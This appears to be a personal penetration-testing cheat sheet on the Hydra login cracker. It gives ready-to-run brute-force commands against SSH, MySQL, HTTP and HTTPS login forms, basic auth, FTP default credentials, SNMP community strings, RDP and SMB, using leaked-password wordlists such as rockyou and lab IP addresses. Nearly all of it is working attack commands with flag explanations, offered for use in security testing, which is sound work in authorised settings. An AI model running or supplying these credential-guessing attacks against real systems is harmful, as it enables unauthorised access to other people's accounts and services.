Hydra is **a parallelized login cracker which supports numerous protocols to attack**. It is very fast and flexible, and new modules are easy to add. This tool makes it possible for researchers and security consultants to show how easy it would be to gain unauthorized access to a system remotely.

Use `seclists/Usernames/Names/names.txt` for *username enumeration*.

---
### Usage
```sh
hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.2.19:22 -t 4 -V -e snr
```

*-l : Login Name
-L : Login Names Text File
-P : Passwords Text File
-M : Bruteforce IP Addresses
-s : Specify port Number (Default is taken if not mentioned)
-t : Number Of Threads, Used To Parellely Request For Connections (Default: 16, Max: 64)
-f : Stop Bruteforce After A Successfull Login Attempt
-6 : Use IPv6![[Pasted image 20230101210733.png]]
-o : Output To A File
-V : Enable Verbosity*
*-m : Module Options*
![[Pasted image 20221105123746.png]]
*-e : Login Options*
![[Pasted image 20221105125028.png]]
![[Pasted image 20221105125157.png]]
```sh
hydra -l msfadmin -P pass.txt 192.168.29.229 -V -e nsr ssh
```
You Can Also Do This Using [[msfconsole]] By Selecting **ssh login scanner auxillary**
While random bruteforcing, you can use `-e` *without* `-P`


---
# Bruteforce MySQL
```sh
hydra mysql://[IP] -l root -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt
```
![[Pasted image 20230101203935.png]]

---
# Bruteforce Login Pages
You Need These Things :-
- **IP Address**
- **HTTP Request : POST or GET**
- **From Inspect Element**
	- *Username ID
	- *Password ID*
	- *Login Button* (For "Log In" : `Log+In`)
	- *Login Failed String (Can Be Just <u>One Of The Words</u>)*
![[Pasted image 20230101210608.png]]


```sh
# For HTTP
hydra -l otis -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt 192.168.1.103 http-post-form "/webmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect." -F -t 40

# For HTTPS
hydra -l otis -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt -s 443 192.168.1.103 https-post-form "/webmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect." -F -t 40
```

```sh
# Use Cookies while brute-forcing a page
hydra 192.168.1.150 -l admin -P pass.txt http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie:PHPSESSID=13f2650bddf7a9ef68858ceea03c5d; security=low"
```

![[Pasted image 20230101231744.png]]
##### Important
If Response doesn't generate any *failed string*, use [[Website Hacking/Tools/Burp Suite/Basics]]!


## Bruteforce Basic Authorization

```sh
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.1.1 http-get / -t 40
```

---
# Using Combo Entries
```sh
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.1.141 ftp
```

![[Pasted image 20231128145330.png]]


---
# Bruteforce SNMP
#snmphydra
```sh
hydra -P /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt snmp://192.168.2.19 -t 30 -V
```

Use the above wordlist or **common-snmp-community-strings-onesixtyone.txt** (Shorter wordlist)
This is will give us the *community string name*.

---
# Bruteforce RDP
```sh
hydra -l Jareth -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt rdp://192.168.1.101 -f -V
```

---
# Bruteforce SMB
```sh
hydra -l Jareth -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt smb://192.168.1.101 -f
```